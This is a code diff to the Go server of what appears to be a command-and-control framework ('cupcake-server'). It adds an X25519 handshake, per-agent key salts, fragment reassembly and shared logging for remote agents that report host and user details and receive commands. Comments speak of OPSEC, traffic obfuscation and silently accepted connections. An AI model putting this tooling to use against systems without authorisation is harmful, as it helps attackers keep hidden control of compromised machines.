@@ -1,23 +1,106 @@
 package services
 
 import (
-	"encoding/json"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
-	"io"
-	"net"
-	"log"
-	"github.com/gorilla/websocket"
-	"github.com/hashicorp/yamux"
-	"github.com/google/uuid"
-	"cupcake-server/pkg/globals"
-	"cupcake-server/pkg/store"
-	"cupcake-server/pkg/model"
-	"cupcake-server/pkg/utils"
+	"encoding/json"
 	"fmt"
+	"io"
+	"log"
+	"net"
 	"strings"
 	"time"
+
+	"cupcake-server/pkg/globals"
+	"cupcake-server/pkg/model"
+	"cupcake-server/pkg/store"
+	"cupcake-server/pkg/utils"
+
+	"github.com/google/uuid"
+	"github.com/gorilla/websocket"
+	"github.com/hashicorp/yamux"
 )
+
+// resolveAgentSalt prefers per-build kdf_salt from register payload (base64 raw bytes).
+func resolveAgentSalt(p map[string]interface{}, fallback string) string {
+	if ks, ok := p["kdf_salt"].(string); ok && strings.TrimSpace(ks) != "" {
+		if raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ks)); err == nil && len(raw) > 0 {
+			s := string(raw)
+			if len(s) > 64 {
+				s = s[:64]
+			}
+			return s
+		}
+	}
+	return fallback
+}
+
+// appendAgentLog appends stdout/stderr lines under LogsMapMu (shared by WS + TCP paths).
+func appendAgentLog(clientUUID string, stdout, stderr string) {
+	globals.LogsMapMu.Lock()
+	defer globals.LogsMapMu.Unlock()
+	logs, _ := globals.LogsMap.LoadOrStore(clientUUID, []string{})
+	logsArr := logs.([]string)
+	if stdout != "" {
+		logsArr = append(logsArr, stdout)
+	}
+	if stderr != "" {
+		logsArr = append(logsArr, "[ERR] "+stderr)
+	}
+	const maxLogsPerAgent = 1000
+	if len(logsArr) > maxLogsPerAgent {
+		logsArr = logsArr[len(logsArr)-maxLogsPerAgent:]
+	}
+	globals.LogsMap.Store(clientUUID, logsArr)
+}
+
+// relayPendingResponse delivers a response map to a waiting API caller if any.
+func relayPendingResponse(reqID string, pMap map[string]interface{}) {
+	if reqID == "" {
+		return
+	}
+	if ch, found := globals.PendingResponses.Load(reqID); found {
+		select {
+		case ch.(chan interface{}) <- pMap:
+		default:
+		}
+	}
+}
+
+// deriveStaticSessionKey derives the static AES material matching the Rust agent
+// get_aes_key() path (SHA256×100k via DeriveKeyAgent) — NOT Argon2id.
+// Noise session keys still take precedence for live traffic via resolveClientSessionKey.
+func deriveStaticSessionKey(encryptKey, encryptionSalt string) []byte {
+	keyBytes := resolveAESKey(encryptKey)
+	saltBytes := make([]byte, 32)
+	copy(saltBytes, []byte(encryptionSalt))
+	return utils.DeriveKeyAgent(keyBytes, saltBytes)
+}
+
+// resolveClientSessionKey returns Noise key if set, else cached SessionKey, else derives once and caches.
+func resolveClientSessionKey(client *globals.Client) []byte {
+	if client == nil {
+		return nil
+	}
+	if client.NoiseSessionKey != [32]byte{} {
+		return client.NoiseSessionKey[:]
+	}
+	if len(client.SessionKey) == 32 {
+		return client.SessionKey
+	}
+	derived := deriveStaticSessionKey(client.EncryptKey, client.EncryptionSalt)
+	client.SessionKey = derived
+	return derived
+}
+
+// pickSessionKey prefers Noise ephemeral key when non-zero, else static derived key.
+func pickSessionKey(noiseSessionKey [32]byte, staticSessionKey []byte) []byte {
+	if noiseSessionKey != [32]byte{} {
+		return noiseSessionKey[:]
+	}
+	return staticSessionKey
+}
 
 func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Listener) {
 	var clientUUID string
@@ -87,6 +170,37 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 	// 🛡️ Anti-DoS: Limit max WebSocket frame size to 50MB to prevent OOM
 	conn.SetReadLimit(50 * 1024 * 1024)
 
+	// === Phase 1: Noise-like Ephemeral Handshake ===
+	// Both sides generate ephemeral keys, derive a per-session key with forward secrecy.
+	psk := resolveAESKey(ln.EncryptKey)
+	var noiseSessionKey [32]byte
+	if len(psk) > 0 {
+		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+		_, clientPubKey, err := conn.ReadMessage()
+		if err != nil || len(clientPubKey) != utils.NoiseMsgLen {
+			log.Printf("Noise handshake failed from %s: err=%v len=%d (want %d X25519)", remoteAddr, err, len(clientPubKey), utils.NoiseMsgLen)
+			return
+		}
+		serverResponse, sessionKey, err := utils.NoiseRespond(clientPubKey, psk)
+		if err != nil {
+			log.Printf("Noise respond failed from %s: %v", remoteAddr, err)
+			return
+		}
+		if err := conn.WriteMessage(websocket.BinaryMessage, serverResponse); err != nil {
+			log.Printf("Noise response send failed to %s: %v", remoteAddr, err)
+			return
+		}
+		noiseSessionKey = sessionKey
+		log.Printf("[Noise] ✅ Handshake completed with %s", remoteAddr)
+	}
+
+	// Derive static session key ONCE per connection (Argon2id is expensive — never per packet)
+	// When Noise succeeded, sessionKey = NoiseSessionKey (never salt-derived static for traffic).
+	keyBytes := resolveAESKey(ln.EncryptKey)
+	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
+	sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
+	fragRe := utils.NewFragReassembler()
+
 	// --- Read Loop ---
 	for {
 		// 🛡️ Anti-Slowloris: Set a read deadline (e.g., 60 seconds per message)
@@ -100,12 +214,12 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 		// OpSec Logic: In Base64 mode, we use TextMessage, otherwise Binary
 		_ = messageType // Avoid "unused" but informative for debugging
 
-		keyBytes := resolveAESKey(ln.EncryptKey)
-		saltBytes := make([]byte, 32)
-		copy(saltBytes, []byte(ln.EncryptionSalt))
-		
-		// Derive the real session key if salt is present
-		sessionKey := utils.DeriveKey(keyBytes, saltBytes)
+		// Prefer live client-cached key after register (Noise or static)
+		if client != nil {
+			sessionKey = resolveClientSessionKey(client)
+		} else {
+			sessionKey = pickSessionKey(noiseSessionKey, staticSessionKey)
+		}
 		
 		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)
 
@@ -115,22 +229,22 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 				log.Printf("Encrypted listener missing AES key for %s", remoteAddr)
 				break
 			}
-			
-			// 1. Deobfuscate
-			deobfuscated := utils.DeobfuscatePacket(message, ln.ObfuscateMode, sessionKey)
-			
-			// 2. Decrypt (compat with legacy client default-padding on "none")
-			decrypted, err := utils.DecryptAESWithCompat(deobfuscated, sessionKey)
+			// Deobfuscate + decrypt, with CKF1 multi-fragment reassembly
+			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
 			if err != nil {
-				log.Printf("Decryption failed for %s: %v", remoteAddr, err)
+				log.Printf("Decryption/reassembly failed for %s: %v", remoteAddr, err)
 				break
 			}
-			plaintext = decrypted
+			if needMore {
+				continue
+			}
+			plaintext = pt
 		} else if len(keyBytes) > 0 {
-			// Auto-detect compatibility
-			deobfuscated := utils.DeobfuscatePacket(message, ln.ObfuscateMode, sessionKey)
-			if decrypted, err := utils.DecryptAESWithCompat(deobfuscated, sessionKey); err == nil {
-				plaintext = decrypted
+			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
+			if err == nil && !needMore {
+				plaintext = pt
+			} else if needMore {
+				continue
 			} else {
 				plaintext = message
 			}
@@ -161,6 +275,8 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 			source, _ := p["source"].(string)
 			if source == "" { source = "disk" }
 
+			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
+
 			// Determine status based on source
 			status := "online"
 			if source == "memory" {
@@ -177,7 +293,7 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 				Arch:      arch,
 				Status:    status,
 				LastSeen:  time.Now(),
-				EncryptionSalt:  ln.EncryptionSalt,
+				EncryptionSalt:  agentSalt,
 				ObfuscationMode: ln.ObfuscateMode,
 			}
 
@@ -186,23 +302,25 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 			}
 
 			client = &globals.Client{
-				WebSocketConn:  conn,
-				Transport:      "websocket",
-				UUID:           id,
-				Hostname:       hostname,
-				OS:             os,
-				Arch:           arch,
-				Username:       username,
-				IP:             remoteAddr,
-				EncryptMode:    ln.EncryptMode,
-				EncryptKey:     ln.EncryptKey,
-				EncryptionSalt: ln.EncryptionSalt,
-				ObfuscateMode:  ln.ObfuscateMode,
-				CommandChannel: make(chan string, 10),
-				OutputChannel:  make(chan string, 10),
-				ListenerID:     ln.ID,
-				ListenerPort:   ln.Port,
-				CachedPlugins:  make(map[string]bool),
+				WebSocketConn:   conn,
+				Transport:       "websocket",
+				UUID:            id,
+				Hostname:        hostname,
+				OS:              os,
+				Arch:            arch,
+				Username:        username,
+				IP:              remoteAddr,
+				EncryptMode:     ln.EncryptMode,
+				EncryptKey:      ln.EncryptKey,
+				EncryptionSalt:  agentSalt,
+				ObfuscateMode:   ln.ObfuscateMode,
+				NoiseSessionKey: noiseSessionKey,
+				SessionKey:      append([]byte(nil), staticSessionKey...),
+				CommandChannel:  make(chan string, 10),
+				OutputChannel:   make(chan string, 10),
+				ListenerID:      ln.ID,
+				ListenerPort:    ln.Port,
+				CachedPlugins:   make(map[string]bool),
 			}
 			clientUUID = id
 
@@ -311,34 +429,11 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 				}
 			}
 
-			// Sync-Async Bridge (Relay original payload map back to API callers)
-			if reqID, ok := pMap["req_id"].(string); ok && reqID != "" {
-				if ch, found := globals.PendingResponses.Load(reqID); found {
-					select {
-					case ch.(chan interface{}) <- pMap:
-					default:
-					}
-				}
+			// Sync-Async Bridge + legacy log buffer (shared helpers for WS/TCP)
+			if reqID, ok := pMap["req_id"].(string); ok {
+				relayPendingResponse(reqID, pMap)
 			}
-
-			// Legacy Logging—限制为最多 1000 条，防止长连接内存泄漏
-			logs, _ := globals.LogsMap.LoadOrStore(clientUUID, []string{})
-			logsArr := logs.([]string)
-			if resp.Stdout != "" {
-				logsArr = append(logsArr, resp.Stdout)
-			}
-			if resp.Stderr != "" {
-				logsArr = append(logsArr, "[ERR] "+resp.Stderr)
-			}
-			// 截断：保留最新的 1000 条
-			const maxLogsPerAgent = 1000
-			if len(logsArr) > maxLogsPerAgent {
-				logsArr = logsArr[len(logsArr)-maxLogsPerAgent:]
-			}
-			globals.LogsMap.Store(clientUUID, logsArr)
-
-			// ⚡ OPSEC: 不要在黑窗口显示具体回显内容，内容已保存到数据库
-			// log.Printf("[C2 Output] Agent %s returned:\n%s\n%s", clientUUID, resp.Stdout, resp.Stderr)
+			appendAgentLog(clientUUID, resp.Stdout, resp.Stderr)
 		}
 	}
 }
@@ -413,7 +508,12 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 		}()
 	}
 
-	// Connection accepted silently
+	// Connection accepted silently — derive static key once; hoist Noise key outside loop
+	var noiseSessionKey [32]byte
+	keyBytes := resolveAESKey(ln.EncryptKey)
+	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
+	tcpFragRe := utils.NewFragReassembler()
+
 	for {
 		// 🛡️ Anti-Slowloris: Set a read deadline for header (30s)
 		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
@@ -445,39 +545,56 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			break
 		}
 
-		keyBytes := resolveAESKey(ln.EncryptKey)
-		saltBytes := make([]byte, 32)
-		copy(saltBytes, []byte(ln.EncryptionSalt))
-		sessionKey := utils.DeriveKey(keyBytes, saltBytes)
+		// Phase 1: X25519 ECDH handshake on TCP (33-byte v1 frame before registration)
+		if clientUUID == "" && length == uint32(utils.NoiseMsgLen) && len(keyBytes) > 0 {
+			serverResponse, sk, err := utils.NoiseRespond(body, keyBytes)
+			if err == nil {
+				noiseSessionKey = sk
+				respHeader := make([]byte, 4)
+				binary.BigEndian.PutUint32(respHeader, uint32(len(serverResponse)))
+				if _, werr := conn.Write(respHeader); werr == nil {
+					conn.Write(serverResponse)
+				}
+				log.Printf("[Noise] ✅ TCP X25519 handshake completed with %s", remoteAddr)
+				continue // Wait for next real message
+			}
+		}
+
+		sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
+		if client != nil {
+			sessionKey = resolveClientSessionKey(client)
+		}
 		
 		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)
 		
-		plaintext := body
+		var plaintext []byte
 		if useAES {
 			if len(keyBytes) == 0 {
 				log.Printf("[TCP] Encrypted listener missing AES key")
 				break
 			}
-			
-			// 1. Deobfuscate
-			deobfuscated := utils.DeobfuscatePacket(body, ln.ObfuscateMode, sessionKey)
-			
-			// 2. Decrypt (compat: strip legacy default padding on GCM failure)
-			decrypted, err := utils.DecryptAESWithCompat(deobfuscated, sessionKey)
+			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
 			if err != nil {
-				log.Printf("[TCP] Decryption failed from %s: body=%d deobf=%d obf_mode=%q key_len=%d err=%v",
-					remoteAddr, len(body), len(deobfuscated), ln.ObfuscateMode, len(sessionKey), err)
+				log.Printf("[TCP] Decryption/reassembly failed from %s: body=%d key_len=%d err=%v",
+					remoteAddr, len(body), len(sessionKey), err)
 				break
 			}
-			plaintext = decrypted
+			if needMore {
+				continue
+			}
+			plaintext = pt
 		} else if len(keyBytes) > 0 {
-			// Auto-detect compatibility
-			deobfuscated := utils.DeobfuscatePacket(body, ln.ObfuscateMode, sessionKey)
-			if decrypted, err := utils.DecryptAESWithCompat(deobfuscated, sessionKey); err == nil {
-				plaintext = decrypted
+			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
+			if err == nil && !needMore {
+				plaintext = pt
+			} else if needMore {
+				continue
 			} else {
 				log.Printf("[TCP] Auto-detect decrypt failed from %s: body=%d err=%v", remoteAddr, len(body), err)
+				plaintext = body
 			}
+		} else {
+			plaintext = body
 		}
 
 		var msg globals.MessageWrapper
@@ -500,6 +617,7 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			arch, _ := p["arch"].(string)
 			source, _ := p["source"].(string)
 			if source == "" { source = "disk" }
+			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
 
 			// Determine status based on source
 			status := "online"
@@ -523,24 +641,26 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			}
 
 			client = &globals.Client{
-				TCPConn:        conn,
-				YamuxSession:   ySession,
-				Transport:      "tcp",
-				UUID:           id,
-				Hostname:       hostname,
-				OS:             os,
-				Arch:           arch,
-				Username:       username,
-				IP:             remoteAddr,
-				EncryptMode:    ln.EncryptMode,
-				EncryptKey:     ln.EncryptKey,
-				EncryptionSalt: ln.EncryptionSalt,
-				ObfuscateMode:  ln.ObfuscateMode,
-				CommandChannel: make(chan string, 10),
-				OutputChannel:  make(chan string, 10),
-				ListenerID:     ln.ID,
-				ListenerPort:   ln.Port,
-				CachedPlugins:  make(map[string]bool),
+				TCPConn:         conn,
+				YamuxSession:    ySession,
+				Transport:       "tcp",
+				UUID:            id,
+				Hostname:        hostname,
+				OS:              os,
+				Arch:            arch,
+				Username:        username,
+				IP:              remoteAddr,
+				EncryptMode:     ln.EncryptMode,
+				EncryptKey:      ln.EncryptKey,
+				EncryptionSalt:  agentSalt,
+				ObfuscateMode:   ln.ObfuscateMode,
+				NoiseSessionKey: noiseSessionKey,
+				SessionKey:      append([]byte(nil), staticSessionKey...),
+				CommandChannel:  make(chan string, 10),
+				OutputChannel:   make(chan string, 10),
+				ListenerID:      ln.ID,
+				ListenerPort:    ln.Port,
+				CachedPlugins:   make(map[string]bool),
 			}
 			clientUUID = id
 
@@ -556,15 +676,15 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 
 			// ⚡️ Upsert Agent to Database
 			agentDBModel := &model.Agent{
-				UUID:      id,
-				Hostname:  hostname,
-				IP:        remoteAddr,
-				OS:        os,
-				Username:  username,
-				Arch:      arch,
-				Status:    status,
-				LastSeen:  time.Now(),
-				EncryptionSalt:  ln.EncryptionSalt,
+				UUID:            id,
+				Hostname:        hostname,
+				IP:              remoteAddr,
+				OS:              os,
+				Username:        username,
+				Arch:            arch,
+				Status:          status,
+				LastSeen:        time.Now(),
+				EncryptionSalt:  agentSalt,
 				ObfuscationMode: ln.ObfuscateMode,
 			}
 			
@@ -613,13 +733,17 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 				}
 			}
 
-			if reqID, ok := pMap["req_id"].(string); ok && reqID != "" {
-				if ch, found := globals.PendingResponses.Load(reqID); found {
-					select {
-					case ch.(chan interface{}) <- pMap:
-					default:
-					}
+			if reqID, ok := pMap["req_id"].(string); ok {
+				relayPendingResponse(reqID, pMap)
+			}
+			if so, se := "", ""; true {
+				if v, ok := pMap["stdout"].(string); ok {
+					so = v
 				}
+				if v, ok := pMap["stderr"].(string); ok {
+					se = v
+				}
+				appendAgentLog(clientUUID, so, se)
 			}
 		}
 	}
@@ -627,15 +751,30 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 
 // WriteEncryptedMessage is a helper to encrypt and send JSON messages to any transport
 func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
+	// Remember non-module commands so module_required can auto-retry after stage
+	if client != nil {
+		var mw *globals.MessageWrapper
+		switch m := msg.(type) {
+		case globals.MessageWrapper:
+			mw = &m
+		case *globals.MessageWrapper:
+			mw = m
+		}
+		if mw != nil && mw.MsgType == "command" {
+			if cp, ok := mw.Payload.(globals.CommandPayload); ok {
+				RememberCommandForModuleRetry(client.UUID, cp)
+			}
+		}
+	}
+
 	data, err := json.Marshal(msg)
 	if err != nil {
 		return err
 	}
 
 	keyBytes := resolveAESKey(client.EncryptKey)
-	saltBytes := make([]byte, 32)
-	copy(saltBytes, []byte(client.EncryptionSalt))
-	sessionKey := utils.DeriveKey(keyBytes, saltBytes)
+	// Use cached/Noise session key — never re-run Argon2id on the hot path
+	sessionKey := resolveClientSessionKey(client)
 	
 	useAES := isAESEnabled(client.EncryptMode) || (strings.TrimSpace(client.EncryptMode) == "" && len(keyBytes) > 0)
 
@@ -662,6 +801,9 @@ func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
 		if strings.ToLower(client.ObfuscateMode) == "base64" {
 			msgType = websocket.TextMessage
 		}
+		// Serialize concurrent WebSocket writers (startWriteLoop + other senders)
+		client.WSWriteMu.Lock()
+		defer client.WSWriteMu.Unlock()
 		return client.WebSocketConn.WriteMessage(msgType, payload)
 	} else if client.Transport == "tcp" {
 		// 🐛 互斥锁防止与 startWriteLoop 并发写导致消息错位
